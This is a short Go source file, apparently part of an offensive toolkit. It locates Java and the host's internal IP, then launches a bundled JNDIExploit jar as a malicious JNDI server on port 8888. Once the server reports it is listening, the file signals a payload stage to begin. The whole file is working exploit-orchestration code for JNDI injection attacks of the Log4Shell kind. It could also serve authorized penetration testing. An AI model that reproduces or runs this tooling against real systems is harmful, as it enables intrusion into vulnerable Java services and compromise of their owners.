package functions

import (
	"fmt"
	"functions/findjava"
	"functions/sysinfo"
	"os/exec"
	"strings"
	"sync"
)

func ExecJNDI(startPayload chan<- bool) {
	jndipath := "./dependencies/jndiexploit1.2/JNDIExploit-1.2-SNAPSHOT.jar"
	javapath := findjava.FindPath()
	ip, err := sysinfo.GetIntIP()
	if err != nil {
		fmt.Println("[+] Error:", err)
		return
	}
	fmt.Println("[+] Starting JNDI exploit server...")
	javapathcmd := exec.Command(javapath, "-jar", jndipath, "-i", ip.String(), "-p", "8888")
	stdout, err := javapathcmd.StdoutPipe()
	if err != nil {
		fmt.Println("[+] Error creating stdout pipe:", err)
		return
	}
	err = javapathcmd.Start()
	if err != nil {
		fmt.Println("[+] Error starting command:", err)
		return
	}
	var wg sync.WaitGroup
	wg.Add(1)
	go func() {
		defer wg.Done()
		var output strings.Builder
		buf := make([]byte, 1024)
		for {
			n, err := stdout.Read(buf)
			if err != nil {
				break
			}
			output.Write(buf[:n])
			fmt.Print(string(buf[:n]))
			if strings.Contains(output.String(), "[+] HTTP Server Start Listening on 8888") {
				startPayload <- true
				break
			}
		}
	}()
	err = javapathcmd.Wait()
	if err != nil {
		fmt.Println("[+] Error:", err)
	}
	wg.Wait()
}
